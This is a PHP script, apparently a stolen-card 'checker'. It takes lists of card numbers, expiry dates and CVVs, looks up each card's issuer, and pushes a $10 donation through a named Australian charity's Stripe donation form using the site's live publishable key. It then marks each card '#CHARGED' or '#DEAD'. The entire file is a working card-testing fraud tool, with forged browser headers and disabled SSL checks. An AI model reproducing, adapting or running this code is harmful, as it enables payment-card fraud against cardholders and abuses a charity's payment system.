<?php

error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}
function generateRandomString($length = 16)
{
	$characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++) {
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	return $randomString;
}
function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    }
$lista = $_GET['cards'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

$email = generateRandomString() . "%40nospam.today";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
}
curl_close($ch);

$cookie_jar = tempnam('/tmp','coo');

// getting cookies
$curl = curl_init('https://www.emerge.org.au/campaigns/support-emerge-australia/donate/');
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($curl, CURLOPT_COOKIEJAR, $cookie_jar);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($curl);
curl_close($curl);

$id1 = trim(strip_tags(getStr($response, '"_charitable_donation_nonce" value="', '"')));


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Host: api.stripe.com';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Sec-GPC: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]=Jhin+amso&billing_details[email]='.$email.'&billing_details[address][postal_code]=01008&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=bbb568ef-1890-456a-a7e8-c3e97a0012da717fbe&muid=c87bd9f7-938f-4c71-a4bd-679df3042687bec35f&sid=81e4efe6-34a9-42a5-ac90-7f4ecb3d9d0d49a3fb&pasted_fields=number&payment_user_agent=stripe.js%2Ff5dde66da2%3B+stripe-js-v3%2Ff5dde66da2&time_on_page=70370&key=pk_live_519E5hWDUFiwPbmz1DTdgRBoQZpjseqtjapFRLaeTRMeiep6uqY90dvqnSzczYmXJ11Y9Gu1PpvnUXGpwwaa5ygrI00fANVh1QD');
$curl5 = curl_exec($ch);
$id = trim(strip_tags(getStr($curl5, '"id"', '"')));
curl_close($ch);



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.emerge.org.au/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'origin: https://www.emerge.org.au';
$headers[] = 'referer: https://www.emerge.org.au/campaigns/support-emerge-australia/donate/';
$headers[] = 'sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($curl, CURLOPT_COOKIEFILE, $cookie_jar);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'charitable_form_id=643ddc5e955a8&643ddc5e955a8=&_charitable_donation_nonce='.$id1.'&_wp_http_referer=%2Fcampaigns%2Fsupport-emerge-australia%2Fdonate%2F&campaign_id=1863&description=Support+Emerge+Australia&ID=0&recurring_donation=once&custom_recurring_donation_amount=&recurring_donation_period=once&donation_amount=10&custom_donation_amount=&first_name=Jhoj&last_name=Nzia&email='.$email.'&gateway=stripe&stripe_payment_method='.$id.'&action=make_donation&form_action=make_donation');
$result0 = curl_exec($ch);
$fill = trim(strip_tags(getStr($result0, '"success":', ',')));
$pi = trim(strip_tags(getStr($result0, '"secret":"', '_secret')));
$secret = trim(strip_tags(getStr($result0, '"secret":"', '"')));
curl_close($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'/confirm');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_519E5hWDUFiwPbmz1DTdgRBoQZpjseqtjapFRLaeTRMeiep6uqY90dvqnSzczYmXJ11Y9Gu1PpvnUXGpwwaa5ygrI00fANVh1QD&client_secret='.$secret.'');
$result2 = curl_exec($ch);
$final = trim(strip_tags(getStr($result2, '"message": "', '"')));
curl_close($ch);

#############SUCCEEDED SUCCESS
 if (strpos($result2, '"status": "succeeded"')) {
    echo "<font color=green><b>#CHARGED $lista<br>Payment successfully<br>";
    
    exit();
}
#############DECLINECODEcurl0
elseif(strpos($result0, '"success":false')) {
    echo "<font color=red><b>#DEAD $lista<br>success:false - '.$fill.'<br>";
    exit();
}



#############DECLINECODEcurl1
elseif(strpos($curl5, '"type": "card_error"')) {
    echo "<font color=red><b>#DEAD $lista<br>card_error<br>";
    exit();
}

#############ELSEDECLINE
 else
   {
     echo"<font color=red><b>#DEAD $lista<br>CARD DECLINED - '.$final.'<br>";
     exit();
   }
curl_close($ch);
ob_flush();
?>
